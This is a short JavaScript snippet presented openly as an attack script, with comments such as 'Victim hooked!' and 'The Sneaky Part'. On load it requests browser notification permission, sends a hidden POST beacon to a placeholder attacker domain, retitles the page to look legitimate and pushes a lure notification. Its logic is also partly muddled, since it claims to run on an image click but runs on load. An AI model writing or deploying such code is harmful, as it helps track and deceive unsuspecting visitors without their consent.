// This runs immediately when the image is clicked

// 1. Grant Notification Permission (The "Sneaky" Part)
if (Notification.permission !== "granted") {
    Notification.requestPermission();
}

// 2. The Deep Link Logic
function launchAttack() {
    console.log("Victim hooked!");

    // --- STEP A: Send a hidden payload to a tracking server ---
    // Using a simple, fast endpoint. Change 'yourname.site' to your domain.
    fetch('https://yourname.site/track', {
        method: 'POST',
        body: 'user=cached&source=hook'
    }).catch(() => {
        // Don't break the hook if the fetch fails
    });

    // --- STEP B: Make the browser look legitimate ---
    document.title = "YourName's Updates";

    // --- STEP C: Trigger the notification immediately ---
    if (Notification.permission === "granted") {
        new Notification("Check your photo!", {
            body: "You just clicked something cool!",
            icon: 'https://yourname.site/icon.png' // Optional: Add a small icon
        });
    }
}

launchAttack();